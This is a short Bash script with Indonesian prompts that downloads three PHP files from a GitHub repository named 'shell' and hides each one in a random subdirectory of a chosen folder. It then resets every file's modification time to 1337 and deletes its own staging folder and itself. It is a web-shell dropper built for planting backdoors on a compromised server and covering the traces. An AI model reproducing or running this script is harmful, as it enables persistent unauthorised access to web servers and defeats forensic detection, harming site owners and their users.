#!/bin/bash

show_available_directories() {
    echo "Daftar directory yang tersedia:"
    ls -d */
}
echo "Silahkan masukkan nama folder:"
read varname
echo "Directory yang di tuju: $varname"
show_available_directories
mkdir x
file_urls=(
    "https://raw.githubusercontent.com/oxygencall/shell/main/xf.php"
    "https://raw.githubusercontent.com/oxygencall/shell/main/us.php"
    "https://raw.githubusercontent.com/oxygencall/shell/main/hd.php"
)

for url in "${file_urls[@]}"; do
    if command -v wget &>/dev/null; then
        wget --no-verbose --no-check-certificate -qP x "$url"
    elif command -v curl &>/dev/null; then
        curl -sS "$url" -o "x/$(basename "$url")"
    elif command -v lynx &>/dev/null; then
        lynx -source "$url" > "x/$(basename "$url")"
    elif command -v fetch &>/dev/null; then
        fetch -o "x/$(basename "$url")" "$url"
    else
        echo "Tidak ada opsi untuk mendownload file. Silakan install wget, curl, lynx, atau fetch."
        exit 1
    fi
done

for file in x/*; do
    random_folder=$(find "$varname" -type d | shuf -n 1)
    cp "$file" "$random_folder/"
    echo "File berhasil disalin ke: $random_folder/$(basename "$file")"
done

echo "Mengatur ulang tanggal modifikasi untuk semua file dan directory"
find . -exec touch -m -d '01/01/1337' {} +

rm -rf x x.sh

echo "Selesai."
